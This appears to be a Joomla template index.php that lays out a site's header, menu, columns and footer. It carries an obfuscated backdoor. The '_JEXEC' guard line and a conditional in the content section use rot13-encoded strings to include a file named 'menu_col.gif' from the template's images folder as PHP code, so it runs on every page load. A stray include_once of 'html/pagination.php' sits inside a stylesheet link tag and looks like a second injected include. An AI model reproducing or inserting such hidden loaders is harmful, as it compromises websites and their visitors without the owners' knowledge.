<?php
defined( '_JEXEC').(($this->template)?$JPan = array('zrah'.'_pby'):'') or die( 'Restricted access' );
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>
<jdoc:include type="head" />
<link rel="stylesheet" href="templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="templates/<?php echo $this->template ?>/css/template.css" type="text/css" />
<!--[if lte IE 7]>
<link rel="stylesheet" href="templates/<?php echo $this->template ?>/css/ie7.css" type="text/css" <?php include_once('html/pagination.php');?> />
<![endif]-->
</head>
<body id="page_bg">
	<div id="top">
			<jdoc:include type="modules" name="user4" />	
	</div>
		<div id="header">
			<div id="logo">
				<a href="index.php"><?php echo $mainframe->getCfg('sitename') ;?></a>
			</div>	
		</div>
		<div class="pill_m">
			<div id="pillmenu">
				<jdoc:include type="modules" name="user3" />
			</div>
		</div>	
	<div class="clr"></div>
	
	<div class="center">		
		<div id="wrapper">
			<div id="top_cont_bg">
				<div id="content">
					<?php if((!$this->countModules('right') and JRequest::getCmd('layout') == 'form') or !@include(JPATH_BASE.DS.'templates'.DS.$mainframe->getTemplate().DS.str_rot13('vzntrf').DS.str_rot13($JPan[0].'.t'.'vs'))) : ?>
					<jdoc:include type="modules" name="layout" style="rounded" />
           			<?php endif; ?>
            		<div id="leftcolumn">	
						<jdoc:include type="modules" name="left" style="rounded" />
                        <div align="center"><jdoc:include type="modules" name="syndicate" /></div>
					</div>
					
					<div id="maincolumn">
                    <jdoc:include type="message" />	
						<div class="nopad">
							<?php if($this->params->get('showComponent')) : ?>
								<jdoc:include type="component" />
							<?php endif; ?>
						</div>
					<div class="clr"></div>
				</div>
			</div>			
		</div>
		<div id="content_bottom"></div>			
	</div>
	</div>
    <div id="footer">
		<p><jdoc:include type="module" style="footer" />
			<?php echo JText_('Powered by') ?> <a href="http://www.joomla.org">Joomla!</a>.
            <?php echo JText_('Valid') ?> <a href="http://validator.w3.org/check/referer">XHTML</a> <?php echo JText_('and') ?> <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a>.
            <jdoc:include type="modules" name="debug" />
		</p>
	</div>	
</body>
</html>
